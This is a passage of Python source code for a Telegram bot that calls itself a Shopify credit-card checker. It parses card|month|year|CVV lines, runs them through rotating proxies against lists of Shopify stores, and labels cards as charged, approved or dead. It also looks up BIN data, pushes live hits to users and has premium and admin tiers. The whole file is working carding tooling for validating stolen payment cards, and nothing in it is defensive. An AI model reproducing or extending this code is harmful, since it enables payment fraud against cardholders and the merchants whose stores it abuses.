    base64url uses A-Z a-z 0-9 - _ and optional = padding.
    A plain ip:port:user:pass with a short plaintext user/pass won't match.
    We require length >= 16 and only base64url chars to avoid false positives.
    """
    if len(s) < 16:
        return False
    return bool(re.fullmatch(r'[A-Za-z0-9\-_]+=*', s))

def _decode_base64url(s: str) -> str:
    """Decode a base64url string, adding padding if needed. Returns original on failure."""
    try:
        # Convert base64url to standard base64
        b64 = s.replace('-', '+').replace('_', '/')
        # Add padding
        pad = (4 - len(b64) % 4) % 4
        b64 += '=' * pad
        return base64.b64decode(b64).decode('utf-8', errors='replace')
    except Exception:
        return s

def normalize_proxy(proxy: str) -> str:
    """
    Normalize a proxy string, decoding base64url-encoded credentials if present.
    Supports formats:
      - ip:port
      - ip:port:user:pass          (plain text)
      - ip:port:b64user:b64pass    (base64url-encoded credentials)
    """
    parts = proxy.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        if _is_base64url(user):
            user = _decode_base64url(user)
        if _is_base64url(pwd):
            pwd = _decode_base64url(pwd)
        return f"{ip}:{port}:{user}:{pwd}"
    return proxy.strip()

# ══════════════════════════════════════════
#  FILE HELPERS
# ══════════════════════════════════════════
def _read_lines(path: str) -> list:
    if not os.path.exists(path):
        return []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []

def load_premium_users(): return _read_lines(PREMIUM_FILE)
def load_sites():         return _read_lines(SITES_FILE)
def load_proxies():
    """Load proxies and decode any base64url credentials on the fly."""
    return [normalize_proxy(p) for p in _read_lines(PROXY_FILE)]

def is_admin(uid):   return uid in ADMIN_IDS
def is_premium(uid): return uid in ADMIN_IDS or str(uid) in load_premium_users()

def save_sites(sites: list):
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        f.write('\n'.join(sites) + ('\n' if sites else ''))

def save_proxies(proxies: list):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        f.write('\n'.join(proxies) + ('\n' if proxies else ''))

def extract_sites(text: str) -> list:
    """Extract domains from messy text using regex."""
    # Matches patterns like domain.com, sub.domain.com, http://domain.com/path
    # but captures only the domain part.
    pattern = r'(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+)'
    sites = []
    for m in re.findall(pattern, text):
        domain = m.lower().strip().rstrip('/')
        if domain and '.' in domain and domain not in sites:
            sites.append(domain)
    return sites

def normalize_site(raw: str) -> str:
    """Strip protocol and trailing slash for storage."""
    # Use the first extracted site if possible, else fallback to basic cleanup
    extracted = extract_sites(raw)
    if extracted:
        return extracted[0]
    return raw.strip().replace('https://', '').replace('http://', '').rstrip('/')

def full_site_url(s: str) -> str:
    """Return the full URL for use in API calls."""
    if s.startswith('http'):
        return s
    return f'https://{s}'

# ══════════════════════════════════════════
#  USER DATABASE  (single users.json file)
# ══════════════════════════════════════════
USER_DB_FILE = 'users.json'
_user_db_lock = asyncio.Lock()

def _load_user_db() -> dict:
    if os.path.exists(USER_DB_FILE):
        try:
            with open(USER_DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _save_user_db(db: dict) -> None:
    with open(USER_DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(db, f, ensure_ascii=False, indent=2)

async def create_user_if_not_exists(uid: int, uname: str) -> None:
    async with _user_db_lock:
        db = _load_user_db()
        key = str(uid)
        if key not in db:
            db[key] = {
                'uid': uid, 'username': uname,
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'cards_checked': 0, 'hits': 0,
            }
        else:
            db[key]['last_seen'] = datetime.now().isoformat()
            if uname and uname != 'unknown':
                db[key]['username'] = uname
        _save_user_db(db)

async def save_user_stats(uid: int, was_successful: bool = False) -> None:
    async with _user_db_lock:
        db = _load_user_db()
        key = str(uid)
        if key not in db:
            db[key] = {'uid': uid, 'username': 'unknown',
                       'first_seen': datetime.now().isoformat(),
                       'cards_checked': 0, 'hits': 0}
        db[key]['last_seen'] = datetime.now().isoformat()
        db[key]['cards_checked'] = db[key].get('cards_checked', 0) + 1
        if was_successful:
            db[key]['hits'] = db[key].get('hits', 0) + 1
        _save_user_db(db)

async def get_user_stats_text(uid: int, uname: str = "User") -> str:
    """
    Build the rich welcome dashboard HTML.
    Matches the screenshot: Plan / Sites / Proxies / Hits / Checks.
    """
    db = _load_user_db()
    data = db.get(str(uid), {})
    plan = "💎 Premium" if is_premium(uid) else "🆓 Free"
    hits   = data.get('hits', 0)
    checks = data.get('cards_checked', 0)
    sites   = len(load_sites())
    proxies = len(load_proxies())
    return (
        f"🥰 Welcome, @{esc(uname)}\n"
        f"{SEP}\n\n"
        f"⚡ <b>Account Overview</b>\n\n"
        f"📝 Plan       »  {plan}\n"
        f"🌐 Sites      »  <b>{sites}</b>\n"
        f"🔌 Proxies    »  <b>{proxies}</b>\n"
        f"💥 Hits       »  <b>{hits}</b>\n"
        f"📈 Checks     »  <b>{checks}</b>\n\n"
        f"{SEP}\n"
        f"💡 Made by <b>@Onyxa_a</b>"
    )

def get_all_user_ids() -> list:
    """Return every user ID ever seen — used by /broadcast."""
    db = _load_user_db()
    result = []
    for k in db:
        try:
            result.append(int(k))
        except Exception:
            pass
    return result

def get_total_users() -> int:
    return len(_load_user_db())

# ══════════════════════════════════════════
#  BIN LOOKUP
# ══════════════════════════════════════════
async def get_bin_info(card_number: str):
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as r:
                if r.status != 200:
                    return '-', '-', '-', '-', '-', ''
                d = await r.json(content_type=None)
                return (d.get('brand','-'), d.get('type','-'), d.get('level','-'),
                        d.get('bank','-'), d.get('country_name','-'),
                        d.get('country_flag',''))
    except Exception:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text: str) -> list:
    cards = []
    # Improved regex to handle various delimiters and spaces
    pattern = r'(\d{15,16})[\s|:/]+(\d{1,2})[\s|:/]+(\d{2,4})[\s|:/]+(\d{3,4})'
    for m in re.findall(pattern, text):
        card, mo, yr, cvv = m
        mo = mo.zfill(2)
        if len(yr) == 2:
            yr = '20' + yr
        cards.append(f"{card}|{mo}|{yr}|{cvv}")
    return cards

# ══════════════════════════════════════════
#  PROXY TESTER  (lightweight HTTP check — fast & reliable)
# ══════════════════════════════════════════
_PROXY_TEST_URLS = [
    'https://api.ipify.org',
    'https://checkip.amazonaws.com',
    'https://icanhazip.com',
]

async def test_proxy(proxy: str) -> dict:
    """
    Validates a proxy with a simple HTTP GET through the proxy.
    Alive = any HTTP response received (200, 301, 403 etc. all count).
    This is fast, doesn't need a test card, and actually works for all proxy types.
    Returns: {proxy, status: 'alive'/'dead', latency_ms: int}
    """
    proxy = normalize_proxy(proxy)
    proxy_url = parse_proxy(proxy)
    if not proxy_url:
        return {'proxy': proxy, 'status': 'dead', 'latency_ms': 0}

    t0 = time.time()
    test_url = random.choice(_PROXY_TEST_URLS)
    try:
        timeout = aiohttp.ClientTimeout(total=PROXY_TIMEOUT)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
            async with session.get(test_url, proxy=proxy_url, allow_redirects=True) as resp:
                latency = int((time.time() - t0) * 1000)
                # Any real HTTP response = proxy is routing traffic
                if resp.status in (200, 201, 204, 301, 302, 307, 308, 400, 403, 404, 405, 429, 503):
                    return {'proxy': proxy, 'status': 'alive', 'latency_ms': latency}
                return {'proxy': proxy, 'status': 'dead', 'latency_ms': latency}
    except (asyncio.TimeoutError, asyncio.CancelledError):
        return {'proxy': proxy, 'status': 'dead', 'latency_ms': 0}
    except Exception:
        return {'proxy': proxy, 'status': 'dead', 'latency_ms': 0}

# ══════════════════════════════════════════
#  SITE TESTER  (fast lightweight — no checkout)
# ══════════════════════════════════════════
async def test_site(site: str, proxy: str) -> dict:
    """
    Fast 2-step site validator using fetch_products() — no checkout, no card.
    Step 1: fetch /products.json through the proxy
    Step 2: confirm at least one available variant exists
    Alive = store accessible + has buyable products.
    """
    full_url = full_site_url(site)
    proxy_norm = normalize_proxy(proxy)

    try:
        result = await asyncio.wait_for(
            fetch_products(full_url, proxy_str=proxy_norm),
            timeout=SITE_TIMEOUT
        )
    except (asyncio.TimeoutError, asyncio.CancelledError):
        return {'site': site, 'status': 'dead', 'gateway': '-', 'price': '-', 'response': 'Timeout'}
    except Exception as ex:
        return {'site': site, 'status': 'dead', 'gateway': '-', 'price': '-', 'response': str(ex)[:80]}

    # fetch_products returns a dict on success, or (False, msg) tuple on failure
    if isinstance(result, dict) and result.get('variant_id'):
        raw_price = result.get('price', '0')
        try:
            price_str = f"${float(raw_price):.2f}" if float(raw_price) > 0 else '-'
        except Exception:
            price_str = '-'
        return {
            'site':     site,
            'status':   'alive',
            'gateway':  'Shopify',
            'price':    price_str,
            'response': f"Variant {result['variant_id']} — {price_str}",
        }

    # Failure tuple: (False, error_message)
    if isinstance(result, tuple) and len(result) == 2:
        err = str(result[1])
    else:
        err = str(result)

    return {'site': site, 'status': 'dead', 'gateway': '-', 'price': '-', 'response': err[:80]}

# ══════════════════════════════════════════
#  CARD CHECKER  (direct engine — no external API)
# ══════════════════════════════════════════
async def check_card(card: str, site: str, proxy: str) -> dict:
    """
    Check one card against one site/proxy pair — calls Shopify engine directly.
    status: 'Charged' | 'Approved' | 'Dead' | 'Error' | 'Site Error'
    """
    if len(card.split('|')) != 4:
        return {'status': 'Dead', 'message': 'Invalid card format',
                'card': card, 'gateway': '-', 'price': '-'}

    full_url = full_site_url(site)
    # Decode base64 proxy credentials before use
    proxy = normalize_proxy(proxy)

    try:
        raw = await asyncio.wait_for(
            shopify_check(card, full_url, proxy),
            timeout=CARD_TIMEOUT
        )
    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timed out',
                'card': card, 'retry': True, 'gateway': '-', 'price': '-'}
    except Exception as e:
        return {'status': 'Site Error', 'message': str(e)[:80],
                'card': card, 'retry': True, 'gateway': '-', 'price': '-'}

    msg  = str(raw.get('Response', '') or '')
    ml   = msg.lower()
    gate = str(raw.get('Gateway', 'Shopify') or 'Shopify')
    price_raw = str(raw.get('Price', '0') or '0')
    try:
        price = f"${float(price_raw):.2f}" if float(price_raw) > 0 else '-'
    except Exception:
        price = '-'

    # 1. Proxy failure → retry
    if any(k in ml for k in _PROXY_DEAD_SIGNALS) or 'proxy error' in ml or 'cannot connect to host' in ml:
        return {'status': 'Site Error', 'message': msg, 'card': card,
                'retry': True, 'is_proxy_error': True, 'gateway': gate, 'price': price}

    # 2. Site infrastructure error → retry
    if any(k in ml for k in _SITE_DEAD_SIGNALS):
        return {'status': 'Site Error', 'message': msg, 'card': card,
                'retry': True, 'is_proxy_error': False, 'gateway': gate, 'price': price}

    # 3. Card hard-dead
    if any(k in ml for k in _CARD_DEAD_SIGNALS):
        return {'status': 'Dead', 'message': msg,
                'card': card, 'site': site, 'gateway': gate, 'price': price}

    # 4. Charged / order placed
    if raw.get('Status') is True and any(k in ml for k in _CHARGED_SIGNALS):
        return {'status': 'Charged', 'message': msg,
                'card': card, 'site': site, 'gateway': gate, 'price': price}

    # 5. Approved / live (bank responded with non-dead code)
    if any(k in ml for k in _APPROVED_SIGNALS):
        return {'status': 'Approved', 'message': msg,
                'card': card, 'site': site, 'gateway': gate, 'price': price}

    # 6. Status=True from engine but no known signal → treat as Approved
    if raw.get('Status') is True:
        return {'status': 'Approved', 'message': msg,
                'card': card, 'site': site, 'gateway': gate, 'price': price}

    # 7. Everything else → Error
    return {'status': 'Error', 'message': msg or 'Unknown response',
            'card': card, 'site': site, 'gateway': gate, 'price': price}

# ══════════════════════════════════════════
#  UI HELPERS
# ══════════════════════════════════════════
def _status_line(status: str) -> str:
    if status == 'Charged':  return "✅  C H A R G E D"
    if status == 'Approved': return "🔥  A P P R O V E D"
    return                          "❌  D E A D"

def _cc_result_text(result: dict, brand, bin_type, level, bank, country, flag) -> str:
    return (
        f"<b>{SEP}</b>\n"
        f"<b>⚡ Checker Result</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"<b>Status  »</b> {_status_line(result['status'])}\n"
        f"<b>Card    »</b> <code>{esc(result['card'])}</code>\n"
        f"<b>Resp    »</b> <code>{esc(str(result.get('message',''))[:110])}</code>\n"
        f"<b>Gate    »</b> {esc(result.get('gateway','?'))} | 💰 {esc(result.get('price','-'))}\n\n"
        f"<b>{SEP}</b>\n"
        f"<b>💠 BIN Info</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"<b>Brand   »</b> {esc(brand)} · {esc(bin_type)} · {esc(level)}\n"
        f"<b>Bank    »</b> {esc(bank)}\n"
        f"<b>Country »</b> {esc(country)} {flag}"
    )

async def _safe_edit(msg, text: str, **kw):
    """Edit a message object. Never raises."""
    try:
        await msg.edit(text, **kw)
    except Exception:
        pass

# ══════════════════════════════════════════
#  REALTIME HIT
# ══════════════════════════════════════════
async def send_realtime_hit(bot, uid, result: dict, hit_type: str):
    brand, bin_type, level, bank, country, flag = await get_bin_info(
        result['card'].split('|')[0])
    badge = "✅ CHARGED" if hit_type == 'Charged' else "🔥 APPROVED"
    msg = (
        f"<b>{SEP}</b>\n"
        f"<b>⚡ HIT — {badge}</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"<b>Card    »</b> <code>{esc(result['card'])}</code>\n"
        f"<b>Resp    »</b> <code>{esc(str(result.get('message',''))[:90])}</code>\n"
        f"<b>Gate    »</b> {esc(result.get('gateway','?'))} | 💰 {esc(result.get('price','-'))}\n"
        f"<b>Time    »</b> {datetime.now().strftime('%d/%m/%Y %H:%M')}\n\n"
        f"<b>Brand   »</b> {esc(brand)} · {esc(bin_type)} · {esc(level)}\n"
        f"<b>Bank    »</b> {esc(bank)}\n"
        f"<b>Country »</b> {esc(country)} {flag}"
    )
    try:
        await bot.send_message(uid, pe(msg), parse_mode='html')
    except Exception:
        pass

# ══════════════════════════════════════════
#  MASS-CHECK PROGRESS / RESULTS
# ══════════════════════════════════════════
async def send_final_results(bot, uid, results: dict, results_id: str = None):
    elapsed  = int(time.time() - results['start_time'])
    h, rem   = divmod(elapsed, 3600)
    m, s     = divmod(rem, 60)
    hits     = ''
    for r in results['charged'][:6]:
        hits += f"✅ <code>{esc(r['card'])}</code>\n"
    for r in results['approved'][:6]:
        hits += f"🔥 <code>{esc(r['card'])}</code>\n"
    for r in results['errored'][:6]:
        hits += f"⚠️ <code>{esc(r['card'])}</code>\n"
    if not hits:
        hits = "No hits / errors."

    auto_removed = results.get('auto_removed_sites', [])
    removed_line = (f"\n🗑 Auto-removed  »  <b>{len(auto_removed)}</b> site(s)"
                    if auto_removed else "")

    summary = (
        f"<b>{SEP}</b>\n"
        f"<b>⚡ Final Results</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"💳 Total    »  <b>{results['total']}</b>\n"
        f"✅ Charged  »  <b>{len(results['charged'])}</b>\n"
        f"🔥 Live     »  <b>{len(results['approved'])}</b>\n"
        f"⚠️ Error    »  <b>{len(results['errored'])}</b>\n"
        f"❌ Dead     »  <b>{len(results['dead'])}</b>\n"
        f"⏳ Time     »  {h}h {m}m {s}s"
        f"{removed_line}\n\n"
        f"<b>Hits / Errors:</b>\n{hits}"
    )

    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"results_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as f:
            await f.write("=" * 60 + "\nSHOPIFY CC CHECKER — @Onyxa_a\n" + "=" * 60 + "\n\n")
            await f.write("Format: CC | Gateway | Price | Response | Site\n")
            await f.write("-" * 60 + "\n\n")

            await f.write(f"CHARGED ({len(results['charged'])}):\n" + "-" * 60 + "\n")
            for r in results['charged']:
                site = r.get('site', 'Unknown')
                await f.write(f"{r['card']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('message','')[:80]} | {site}\n")
            await f.write("\n")

            await f.write(f"APPROVED ({len(results['approved'])}):\n" + "-" * 60 + "\n")
            for r in results['approved']:
                site = r.get('site', 'Unknown')
                await f.write(f"{r['card']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('message','')[:80]} | {site}\n")
            await f.write("\n")

            await f.write(f"ERROR ({len(results['errored'])}):\n" + "-" * 60 + "\n")
            for r in results['errored']:
                site = r.get('site', 'Unknown')
                await f.write(f"{r['card']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('message','')[:80]} | {site}\n")
            await f.write("\n")

            await f.write(f"DEAD ({len(results['dead'])}):\n" + "-" * 60 + "\n")
            for r in results['dead']:
                site = r.get('site', 'Unknown')
                await f.write(f"{r['card']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('message','')[:80]} | {site}\n")

            if auto_removed:
                await f.write(f"\nAUTO-REMOVED SITES ({len(auto_removed)}):\n" + "-" * 60 + "\n")
                for s in auto_removed:
                    await f.write(f"{s}\n")
    except Exception as e:
        logging.error(f"Error writing results file: {e}")

    rid = f"{uid}_{int(time.time())}"
    _recheck_store[rid] = [r['card'] for r in results['errored']]
    buttons = []
    if results['errored']:
        buttons.append([Button.inline("🔄 Recheck Errors", f"recheck_{rid}", style="danger")])
    buttons.append([Button.inline("🗑 Close", b"close_results", style="danger")])

    try:
        await bot.send_message(uid, pe(summary), file=fname, buttons=buttons, parse_mode='html')
    except Exception:
        try:
            await bot.send_message(uid, pe(summary), buttons=buttons, parse_mode='html')
        except Exception:
            pass
    try:
        os.remove(fname)
    except Exception:
        pass

# ══════════════════════════════════════════
#  PROGRESS UPDATER (for mass check)
# ══════════════════════════════════════════
async def update_progress(msg_obj, results: dict, checked: int):
    elapsed = int(time.time() - results['start_time'])
    h, rem = divmod(elapsed, 3600)
    m, s = divmod(rem, 60)
    total = results['total']
    bar = make_bar(checked, total)
    pct = int(100 * checked / max(total, 1))

    removed_ct = len(results.get('auto_removed_sites', []))
    removed_line = f"\n🗑 Auto-removed  »  <b>{removed_ct}</b> site(s)" if removed_ct else ""

    text = (
        f"<b>{SEP}</b>\n"
        f"<b>⚡ Mass Check Running</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"{bar}  {pct}%  ({checked}/{total})\n\n"
        f"✅ Charged » <b>{len(results['charged'])}</b>\n"
        f"🔥 Live    » <b>{len(results['approved'])}</b>\n"
        f"⚠️ Error   » <b>{len(results['errored'])}</b>\n"
        f"❌ Dead    » <b>{len(results['dead'])}</b>"
        f"{removed_line}\n\n"
        f"<b>Card    »</b> <code>{esc(results.get('last_card', '—'))}</code>\n"
        f"<b>Resp    »</b> <code>{esc(results.get('last_resp', '—'))[:40]}</code>\n"
        f"<b>Gate    »</b> {esc(results.get('last_gate', '—'))}\n"
        f"<b>Time    »</b> {h}h {m}m {s}s"
    )
    buttons = [
        [Button.inline(f"✅ {len(results['charged'])}  Charged", b"_none", style="success"),
         Button.inline(f"🔥 {len(results['approved'])}  Live",   b"_none", style="success")],
        [Button.inline(f"⚠️ {len(results['errored'])}  Error",   b"_none", style="danger"),
         Button.inline(f"❌ {len(results['dead'])}  Dead",       b"_none", style="danger")],
        [Button.inline("⏸ Pause", b"pause", style="primary"),
         Button.inline("▶ Resume", b"resume", style="success"),
         Button.inline("🛑 Stop", b"stop", style="danger")],
    ]
    await _safe_edit(msg_obj, pe(text), buttons=buttons, parse_mode='html')

# ══════════════════════════════════════════
#  PROXY CHECK HELPER  (shared by /proxyall, /chkproxy .txt)
# ══════════════════════════════════════════
async def _run_proxy_check(sm, proxy_list: list, save: bool = True):
    """Check a list of proxies with progress. If save=True, overwrites proxies.txt."""
    alive, dead = [], []
    batch_sz    = 25

    for i in range(0, len(proxy_list), batch_sz):
        batch = proxy_list[i:i + batch_sz]
        res   = await asyncio.gather(*[test_proxy(p) for p in batch])

        for r in res:
            if r['status'] == 'alive':
                alive.append((r['proxy'], r['latency_ms']))
            else:
                dead.append(r['proxy'])

        checked = i + len(batch)
        bar     = make_bar(checked, len(proxy_list))
        pct     = int(100 * checked / max(len(proxy_list), 1))
        await _safe_edit(
            sm,
            pe(
                f"<b>🔌 Checking Proxies...</b>\n\n"
                f"{bar}  {pct}%  ({checked}/{len(proxy_list)})\n\n"
                f"✅ Alive  »  {len(alive)}\n"
                f"❌ Dead   »  {len(dead)}"
            ),
            parse_mode='html'
        )

    # Sort alive by latency (fastest first)
    alive.sort(key=lambda x: x[1])
    alive_proxies = [p for p, _ in alive]

    if save:
        save_proxies(alive_proxies)

    preview = ''
    for p, lat in alive[:8]:
        preview += f"  ✅ <code>{esc(p)}</code>  <i>{lat}ms</i>\n"
    if len(alive) > 8:
        preview += f"  +{len(alive)-8} more\n"

    summary = (
        f"<b>{SEP}</b>\n"
        f"<b>🔌 Proxy Check Done</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"📊 Total   »  {len(proxy_list)}\n"
        f"✅ Alive   »  {len(alive)}\n"
        f"❌ Dead    »  {len(dead)}"
        + (f"\n\n<code>proxies.txt</code> updated ✅" if save else "")
        + (f"\n\n{preview}" if preview else "")
    )
    await _safe_edit(sm, pe(summary), parse_mode='html')

# ══════════════════════════════════════════
#  SITE ADD HELPER  (shared by /site add-mode)
# ══════════════════════════════════════════
async def _run_site_add(sm, sites_list: list, proxies: list, uid: int):
    """Test each site and append alive ones to sites.txt. Sends a .txt report."""
    existing = set(load_sites())
    added_results, skipped, dead_results = [], [], []
    batch_sz = 15
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'paused': False}

    for i in range(0, len(sites_list), batch_sz):
        if session_key not in active_sessions:
            break
        batch = sites_list[i:i + batch_sz]
        fp    = load_proxies() or proxies
        res   = await asyncio.gather(*[test_site(s, random.choice(fp)) for s in batch])

        for r in res:
            s = r['site']
            if r['status'] == 'alive':
                if s in existing or s in [x['site'] for x in added_results]:
                    skipped.append(s)
                else:
                    added_results.append(r)
                    existing.add(s)
            else:
                dead_results.append(r)

        checked = i + len(batch)
        bar     = make_bar(checked, len(sites_list))
        pct     = int(100 * checked / max(len(sites_list), 1))
        await _safe_edit(
            sm,
            pe(
                f"<b>🔄 Testing Sites...</b>\n\n"
                f"{bar}  {pct}%  ({checked}/{len(sites_list)})\n\n"
                f"✅ Added    »  {len(added_results)}\n"
                f"⚠️ Exists  »  {len(skipped)}\n"
                f"❌ Dead    »  {len(dead_results)}"
            ),
            buttons=[[Button.inline("🛑 Cancel", b"stop", style="danger")]],
            parse_mode='html'
        )

    if session_key in active_sessions:
        del active_sessions[session_key]

    if added_results:
        async with aiofiles.open(SITES_FILE, 'a') as f:
            await f.write('\n'.join(r['site'] for r in added_results) + '\n')
        update_site_meta(added_results)

    # Build and send .txt report
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sites_report_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as f:
            await f.write("=" * 60 + "\nSITE TEST REPORT — @Onyxa_a\n" + "=" * 60 + "\n")
            await f.write(f"Tested: {datetime.now().strftime('%d/%m/%Y %H:%M')}\n")
            await f.write(f"Format: Site | Gateway | Price | Response\n")
            await f.write("-" * 60 + "\n\n")
            await f.write(f"ALIVE ({len(added_results)}):\n" + "-" * 60 + "\n")
            for r in added_results:
                await f.write(f"{r['site']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('response','')[:80]}\n")
            await f.write(f"\nDEAD ({len(dead_results)}):\n" + "-" * 60 + "\n")
            for r in dead_results:
                await f.write(f"{r['site']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('response','')[:80]}\n")
            if skipped:
                await f.write(f"\nALREADY EXISTS ({len(skipped)}):\n" + "-" * 60 + "\n")
                for s in skipped:
                    await f.write(f"{s}\n")
    except Exception as e:
        logging.error(f"Error writing site report: {e}")

    summary = (
        f"<b>{SEP}</b>\n"
        f"<b>✅ Sites Added</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"📊 Total    »  <b>{len(sites_list)}</b>\n"
        f"✅ Added    »  <b>{len(added_results)}</b>\n"
        f"⚠️ Exists  »  <b>{len(skipped)}</b>\n"
        f"❌ Dead    »  <b>{len(dead_results)}</b>\n\n"
        f"📄 Full report attached below."
    )
    try:
        await sm.client.send_file(sm.chat_id, fname,
                                  caption=pe(summary), parse_mode='html')
        await sm.delete()
    except Exception:
        await _safe_edit(sm, pe(summary), parse_mode='html')
    try:
        os.remove(fname)
    except Exception:
        pass

# ══════════════════════════════════════════
#  SITE CHECK HELPER  (clean existing sites.txt)
# ══════════════════════════════════════════
async def _run_site_check(sm, sites: list, proxies: list, uid: int):
    """Test all sites in sites.txt, remove dead ones, send .txt report."""
    alive_results, dead_results = [], []
    batch_sz    = 15
    session_key = f"{uid}_{sm.id}"
    active_sessions[session_key] = {'paused': False}

    for i in range(0, len(sites), batch_sz):
        if session_key not in active_sessions:
            break
        batch = sites[i:i + batch_sz]
        fp    = load_proxies() or proxies
        res   = await asyncio.gather(*[test_site(s, random.choice(fp)) for s in batch])

        for r in res:
            if r['status'] == 'alive':
                alive_results.append(r)
            else:
                dead_results.append(r)

        checked = i + len(batch)
        bar     = make_bar(checked, len(sites))
        pct     = int(100 * checked / max(len(sites), 1))
        await _safe_edit(
            sm,
            pe(
                f"<b>🔄 Site Check Progress</b>\n\n"
                f"{bar}  {pct}%  ({checked}/{len(sites)})\n\n"
                f"✅ Alive  »  {len(alive_results)}\n"
                f"❌ Dead   »  {len(dead_results)}"
            ),
            buttons=[[Button.inline("🛑 Cancel", b"stop", style="danger")]],
            parse_mode='html'
        )

    if session_key in active_sessions:
        del active_sessions[session_key]

    save_sites([r['site'] for r in alive_results])
    update_site_meta(alive_results)

    # Build and send .txt report
    ts    = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sites_check_{uid}_{ts}.txt"
    try:
        async with aiofiles.open(fname, 'w') as f:
            await f.write("=" * 60 + "\nSITE CHECK REPORT — @Onyxa_a\n" + "=" * 60 + "\n")
            await f.write(f"Checked: {datetime.now().strftime('%d/%m/%Y %H:%M')}\n")
            await f.write(f"Format: Site | Gateway | Price | Response\n")
            await f.write("-" * 60 + "\n\n")
            await f.write(f"ALIVE ({len(alive_results)}):\n" + "-" * 60 + "\n")
            for r in alive_results:
                await f.write(f"{r['site']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('response','')[:80]}\n")
            await f.write(f"\nDEAD / REMOVED ({len(dead_results)}):\n" + "-" * 60 + "\n")
            for r in dead_results:
                await f.write(f"{r['site']} | {r.get('gateway','-')} | {r.get('price','-')} | {r.get('response','')[:80]}\n")
    except Exception as e:
        logging.error(f"Error writing site check report: {e}")

    summary = (
        f"<b>{SEP}</b>\n"
        f"<b>✅ Site Check Complete</b>\n"
        f"<b>{SEP}</b>\n\n"
        f"📊 Total    »  <b>{len(sites)}</b>\n"
        f"✅ Alive    »  <b>{len(alive_results)}</b>\n"
        f"❌ Removed  »  <b>{len(dead_results)}</b>\n\n"
        f"📄 Full report attached below.\n"
        f"<code>sites.txt</code> updated ✅"
    )
    try:
        await sm.client.send_file(sm.chat_id, fname,
                                  caption=pe(summary), parse_mode='html')
        await sm.delete()
    except Exception:
        await _safe_edit(sm, pe(summary), parse_mode='html')
    try:
        os.remove(fname)
    except Exception:
        pass

# ══════════════════════════════════════════
#  BOT INIT
# ══════════════════════════════════════════
bot = TelegramClient('checker_bot', API_ID, API_HASH)

def _main_kb(uid=None):
    rows = [[Button.inline("  Commands", b"show_cmds", style="primary")]]
    if uid and is_admin(uid):
        rows.append([Button.inline("  Admin Panel", b"admin_panel", style="primary")])
    rows.append([Button.url("  Channel", "https://t.me/+PPz51xKsYngxNzA0")])
    return rows

def _back_kb():
    return [[Button.inline("« Back", b"main_menu", style="danger")]]

# ══════════════════════════════════════════
#  /start
# ══════════════════════════════════════════
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        uname  = sender.username or f"user_{uid}"
    except Exception:
        uname = f"user_{uid}"
    await create_user_if_not_exists(uid, uname)
    text = await get_user_stats_text(uid, uname)
    kw   = dict(buttons=_main_kb(uid), parse_mode='html')
    if os.path.exists(WELCOME_IMAGE):
        await event.reply(pe(text), file=WELCOME_IMAGE, **kw)
    else:
        await event.reply(pe(text), **kw)

# ══════════════════════════════════════════
#  CALLBACKS
# ══════════════════════════════════════════
@bot.on(events.CallbackQuery)
async def on_callback(event):
    uid  = event.sender_id
    data = event.data.decode()

    if data == '_none':
        await event.answer()
        return

    if data == "show_cmds":
        text = (
            f"<b>{SEP}</b>\n"
            f"b Commands</b>\n"
            f"<b>{SEP}</b>\n\n"
            f"<b>💳 Checking</b>\n"
            f"├─ /cc  <code>card|mm|yy|cvv</code>\n"
            f"├─ /chk  (reply to .txt file)\n"
            f"└─ /mcancel  stop mass check\n\n"
            f"<b>🌐 Sites</b>\n"
            f"├─ /site           test &amp; clean sites.txt\n"
            f"├─ /site url       add &amp; test new site(s)\n"
            f"├─ /mysites        list sites + gateway/price\n"
            f"├─ /rmsites url    remove specific site(s)\n"
            f"└─ /rmsite         clear ALL sites\n\n"
            f"<b>🔌 Proxies</b>\n"
            f"├─ /chkproxy       adds working proxies\n"
            f"├─ /proxyall       test &amp; clean all saved\n"
            f"├─ /clearproxy     clear all proxies\n"
            f"└─ /getproxy       download proxy list\n\n"
            f"<b>Format:</b> <code>card|mm|yyyy|cvv</code>\n"
            f"<b>Proxy :</b> <code>ip:port:user:pass</code>"
        )
        await event.edit(pe(text), buttons=_back_kb(), parse_mode='html')
        await event.answer()

    elif data == "admin_panel":
        if not is_admin(uid):
            await event.answer("❌ Admin only", alert=True)
            return
        text = (
            f"<b>{SEP}</b>\n"
            f"b Admin Panel</b>\n"
